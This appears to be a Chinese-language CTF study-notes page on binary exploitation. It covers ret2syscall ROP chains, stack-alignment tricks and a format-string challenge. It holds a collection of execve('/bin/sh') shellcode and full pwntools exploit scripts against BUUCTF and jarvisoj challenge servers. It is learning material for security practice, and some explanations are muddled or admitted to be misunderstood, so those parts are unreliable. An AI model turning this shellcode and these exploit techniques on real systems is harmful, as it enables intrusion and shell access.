1.ret2syscall
==

介绍#
-
控制程序执行系统调用，获取 shell

判断#
-
如果没有system和开启了NX（栈不可执行）保护可以用（有system最好用ret2text，方便省事，没开NX直接ret2shellcode）

步骤#
-

32位和64位的syscall原理都是一样，只有传参和调用存在差异，以下一起说，做个对比。<br>

    32位系统调用使用 " int 80h "
    64位系统调用使用 " syscall " （汇编代码就是syscall 直接ROPgadget--only查找即可）
    
32的系统调用号与64位的不大一样 使用的时候最好百度一下

    32位     #define __NR_execve 11
    64位     #define __NR_execve 59   （0x3b）

32位的系统调用号放在eax 传参依次是 **EBX、ECX、EDX、ESI、EDI、EBP**   <br>
64位的系统调用号放在rax 传参依次是 **RDI、RSI、RDX、R10、R8、R9**  （和64位函数传参一样）<br>


构造ROP chain:<br>
①没有/bin/sh字眼 只能自己加到bss区域，然后调用execve("/bin/sh",NULL,NULL)<br>
查找bss：<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/7b7d482f-4c63-46f8-9917-d568ac11ab05)
<br>

②有/bin/sh，溢出成功后，通过寻找特定的寄存器，以寄存器承载特定的数据，构造 execve(“/bin/sh”,NULL,NULL) 的汇编实现，将其部署栈中，劫持控制流实现获取 shell。
<br>
如何构造汇编实现？(64bit)

    execve("/bin/sh",NULL,NULL)
    系统调用号，rax为59
    第一个参数，rdi指向/bin/sh
    第二个参数，为0
    第三个参数，为0
    第四个参数，为0
    第五个参数，rsi为0
    payload = "A"*offset(偏移量) + flat(rdi,bin_sh,rax_rdx_rbx,59,0,0,rsi,0,syscall)

查找各寄存器地址：

```
ROPgadget --binary ret2syscall --only "syscall|ret"
ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'rdx'    #rdx=0x000000000040168b
```

![image](https://github.com/xhsy0314/Task/assets/84487619/6979353a-b56c-4ae4-9739-a244bad2fc38)


2.shellcode
==

shellcode收集：(持续补充)

```
# 32位 短字节shellcode --> 21字节
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

# 32位 纯ascii字符shellcode
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA

# 32位 scanf可读取的shellcode
\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh

# 64位 scanf可读取的shellcode 22字节
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05

# 64位 较短的shellcode  23字节
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

# 64位 纯ascii字符shellcode
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
```

```
shellcode=""
io.sendline(shellcode)
```

3.system函数参数非/bin/sh (64位)
-

```
__int64 dofunc()
{
  __int64 buf; // [rsp+8h] [rbp-8h] BYREF

  buf = 0LL;
  puts("input:");
  read(0, &buf, 0x100uLL);
  return 0LL;
}
```

buf栈溢出，动态调试计算能够输入的长度:

```
gdb file
b main
r
n    ---步过，直到执行到某个函数
s    ---进入该函数
n    ---直到回车后提示输入数据
随便输入一些数据
stack 24    ---查看栈情况
```

![image](https://github.com/xhsy0314/Task/assets/84487619/87c3d24b-8fa0-4954-8c7b-2d581f2feb08)<br>

rbp-rsi之间就是buf中能够输入数据的长度，也是填充数据的长度，这里是0x10-0x8=8.<br>
然后还需要填充8个字节的数据，因为rbp占8个字节。也就是一共填充16个垃圾数据。<br>

易忽略的点：**64位程序中的system函数的栈对齐问题**

1、将system函数地址+1，此处的+1，即是把地址+1，也可以理解为<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/eb180202-e2d8-487b-9baf-750facc25279)<br>
本来我们应该是用401186这个地址的，但是我们现在要跳过一条指令，那自然就是用401187，这样就跳过了push rbp这条指令。
2、直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/d13b7ae2-28d0-452d-a88e-f83db2e3e31c)<br>


因此payload：

```
payload = b'a' * offset # 溢出大小
payload += p64(ret) # ret地址
payload += p64(pop rdi) # pop rdi地址
payload += p64(binsh) # /bin/sh字符串地址
payload += p64(sys) # _system函数地址
```

其中ret地址就是上图中的0x401198.<br>
pop rdi：
```
ROPgadget --binary find_sh --only 'pop|ret' | grep 'rdi' 
```
![image](https://github.com/xhsy0314/Task/assets/84487619/e8b3f0a0-9b54-4d6f-9341-a4490d350efd)<br>

binsh:<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/9a492389-2b47-49b4-a542-93f3e9e6a615)
<br>

system:<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/9af975e0-7e9f-4da9-8083-81dcd2d039ca)<br>

完整exp：

```
from pwn import *
							
#p=process("./stack_overflow")
io=remote("10.140.32.159",48126)

binsh=0x404040
sys=0x401070
ret=0x401198
poprdi=0x0000000000401253
#p64(0x0000000000401198) +
payload= b'A'*8 +b'B'*8 +p64(ret)+p64(poprdi)+p64(0x404040)+ p64(sys)

io.sendline(payload)
io.interactive()
```

4.一道简单栈溢出的三种做法（BUUCTF rip）
--
main函数反编译后很简单，容易观察到存在栈溢出<br>

![image](https://github.com/xhsy0314/Task/assets/84487619/ac28750b-44b4-49d6-abad-370be872f243)
<br>
点进变量s，观察到填充的数据为15个<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/eed9c000-ba92-490c-9462-eb348e3c680e)
<br>

又看到存在system binsh 在fun这个函数里，该函数地址为0x401186<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/9555438b-8c3e-4e90-a040-674f802afd7e)
<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/2ee861cd-206b-44ff-910c-1e78b228ba43)
<br>
**第一种payload：**

```
payload=b'A'*15+b'B'*8+p64(0x401198)+p64(0x401186)
#p64(0x401198) 为fun函数的返回地址，加上这个地址是由于64位程序有一个栈对齐的问题
#另外填充的这8字节是rbp所占的8字节
```
![image](https://github.com/xhsy0314/Task/assets/84487619/2cc8f287-aa55-4e69-b79b-d7950899b387)
<br>
**第二种payload：**
```
payload =b "a" * 23 +p64(0x401187)
#0x401187是push  rbp 这条指令的下一步，也就不存在栈不对齐的问题了
```

**第三种payload：**
```
payload =b "a" * 15 +p64(0x401186)
#这应该是最寻常的做法
```
5.栈溢出变形——覆盖某个变量的值（BUUCTF ciscn_2019_n_1）
--

题目中func函数的反编译代码：<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/352eb273-7e46-45cd-84f0-9fd86c520615)

<br>
分析可知需要利用v1变量来构成栈溢出，来使v2变量的值变成11.28125，从而调用system("cat /flag")查看flag<br>
点进v1,可以看到v1v2两个变量之间的距离为（0x30-0x4=44），也就是44个字节，所以需要将这44个字节填充起来，然后再将11.28125传入进去<br>

这里一开始不知道怎么传入11.28125，原来是需要找到这个数字的地址，<br>
我们观察func函数二进制指令，<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/0f2dbf8e-18c3-4aa5-8eb4-acbb2c52fa57)
<br>
发现有两个比较指令，那么这个cs:dword_4007F4很有可能就是11.28125所在的地址。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/488c2ad9-dbd1-43eb-88fd-85ed564e0313)<br>

点进去看看，果然找到了<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/0b089f92-533a-470f-8384-0aa35236f1ca)
<br>
所以11.28125的地址就为0x41348000。

构造payload：

```
payload=b'A'*44+p64(0x41348000)
```

5.32位溢出
--

**例1：buuctf pwn1_sctf_2016**
题目给出的程序为32位，开启nx（堆栈不可执行）保护，就是说我们没法往堆栈上写东西.<br>
存在这么几个关键函数<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/fe03892f-74aa-4d23-9c87-d54d81fec7de)
<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/a55ceefc-6399-4a65-b59e-077b124950e4)
<br>
其中， fgets(s, 32, edata);那一行是我们的输入点，依靠这里来构成溢出。点进s这个变量观察到他有0x3c（60个）个字节的位置，而fgets只往里输入了32个字节，无法构成溢出。再往下看，replace((std::string *)v3);  这个函数将一个字节的“I”替换成三个字节的“you”，思路来了，我们输入20字节的 “I” ，经过第19行的replace函数后会变成60字节的 “you” ，这样就可以进行溢出了，之后覆盖ebp，覆盖返回地址为输出flag的函数地址，就可以完成利用。
```
payload=b'I'*20+b'AAAA'+p32(getflag)
```

**例2：jarvisoj_level2**
<br>
这道题是比较普通的栈溢出，但是第一遍构造payload之后没打通，看了别人wp之后意识到用system的地址覆盖返回地址之后，**需要跟随便一个地址**，这个地址是system函数执行的地址。
<br>
具体看一下:<br>
<br>
很明显的栈溢出，system和binsh也都有，那么直接构造payload：
```
payload = b'A'*0x88+b'B'*0x4+p32(0x08048320)+p32(0)+p32(0x0804A024)
#0x08048320是system_plt,0x0804A024是/bin/sh地址，p32(0)注意不要漏掉因为是system的执行地址，实际上也可以写成任意一个地址，比如#p32(0xdeadbeef),p32(0x12345678)...
```

6.格式化字符串的三种解法（buuctf PWN5）
--

查看文件，开启了Canary，NX，部分RELRO。<br>
main函数：
```
int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```
由于开了Canary，首先考虑格式化字符串漏洞。 printf(buf)这里确实存在该漏洞。
<br>
对于重点部分的解读：
```
 fd = open("/dev/urandom", 0); // 读取随机数文件
  read(fd, &dword_804C044, 4u); // fd , &dword_804C044 , 4u 分别代表： fd 文件描述符 ； &dword_804C044 用于临时存放读取到的数据 ； 4u 欲读取到的数据 ； 返回值 实际读到的字节数。类型为 long int。在这里表示 从 fd 中读取随机数，存放进 &dword_804C044 中，预设读取大小为 4u
  printf("your name:");
  read(0, buf, 0x63u); // 读取键盘输入的数据，大小为 63
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu); // 读取键盘输入的数据 大小为 0xF 的字符串，使得password = buf 即可获取shell
```


首先计算偏移，输入：
```
aaaa %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
```
![image](https://github.com/xhsy0314/Task/assets/84487619/20fa66c8-9f42-4183-ab15-dc54863a5e8f)
<br>
看出偏移量为10.

***********************

**解法1：使用pwntools的 fmtstr_payload 函数**(目前最理解的一种)<br>

_原理：因为No PIE，可以直接格式化字符串篡改atoi为system。使用 fmtstr_payload 进行简化格式化字符串，通过替换atoi提前调用system，再手动输入/bin/sh获取shell。_


```
fmtstr_payload(offset, {printf_got: system_addr})
fmtstr_payload(偏移，{原地址：目的地址})
```
本题中原地址就是atoi的got表地址，目的地址就为system的plt地址。
<br>
那么现在通过ida找到这两个地址：

**atoi_got:**
双击函数列表中的atoi，可以看到外部引用的地址。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/52cbe470-216c-4fb5-8478-980110825204)
<br>

双击这里的偏移，即可跳转到plt地址。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/7f75b66e-90d5-4bf0-b37f-bf94e4e08eee)
<br>

![image](https://github.com/xhsy0314/Task/assets/84487619/2e734045-adb5-4286-9178-3a23cf43e41f)
<br>
看到这里仍存在跳转指令，继续双击，找到got表地址。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/5ee0647b-f0b2-4a85-b5d0-9661ea7d1b9f)
<br>
所以atoi_got=0x0804C034

**sys_plt**:
直接能找到为0x08049080<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/6e3dac22-a3a3-4cf3-86dd-e9e32d03623f)
<br>

也可以通过ELF查找
**exp1：**
```
from pwn import *
							
io=remote("node4.buuoj.cn",28012)

#elf = ELF('./pwn5')
#atoi_got = elf.got['atoi']
#system_plt = elf.plt['system']

atoi_got=0x0804C034
sys_plt=0x08049080
payload=fmtstr_payload(10,{atoi_got:sys_plt})

io.recv()
io.sendline(payload)
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()
```

***************

**解法2：**

<br>
需要用到 dword_804C044 地址0x0804C044。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/727c2707-7270-40b9-a0a0-3ead49e80acb)
<br>

利用偏移量10：

		%10$n
		用 %10$ 定位到这4个地址，从第十位偏移，也就是0x804C044开始到0x804C047
		读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中
		 
		%{number}c表示写入的数，%{index}$n表示以偏移index位置的值为地址写入，其中n写入四字节，hn写入两字节，hhn写入单字节

**exp2：**
```
from pwn import*
 
p =remote("node4.buuoj.cn",25976)
elf = ELF('./pwn')
bss_addr = 0x804C044
 
payload = p32(bss_addr) + p32 (bss_addr + 1 ) + p32(bss_addr + 2) + p32(bss_addr + 3)
payload2 = b'%10$n%11$n%12$n%13$n'
#读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中
 
p.sendline(payload+payload2)
p.sendline(str(0x10101010))
# 0x10101010  4 * len(p32(0x804C044)) = 0x10
p.interactive()
```
关于0x10101010这里有点不理解。。。<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/f29d9984-5c1d-47ea-9003-23857a2ffa0c)<br>


*****

**解法3：将 dword_804C044 修改为任意值**<br>

_通过 fmtstr_payload 将 dword_804C044 的内容替换为0x1，而非随机数
随后输入同样的值 0x1 即可通过if判断，获取shell。_
<br>
利用这里的比较，
<br>
![image](https://github.com/xhsy0314/Task/assets/84487619/02c9a959-29b1-4d07-b39e-d818eca27c91)
<br>

_将 dword_804C044 修改为任意值，然后再次输入此值即可获取shell_<br>

比如将  dword_804C044 修改为 0x1:
**exp3：**
```
from pwn import*
 
io =remote("node4.buuoj.cn",25976)
elf = ELF('./pwn')
bss_addr = 0x804C044
 
io.recv()
payload = fmtstr_payload(10,{bss_addr:0x1})
io.sendline(payload)
io.recv()
#这里注释掉这两个recv()也能运行
io.sendline(str(0x1))
io.interactive()
```
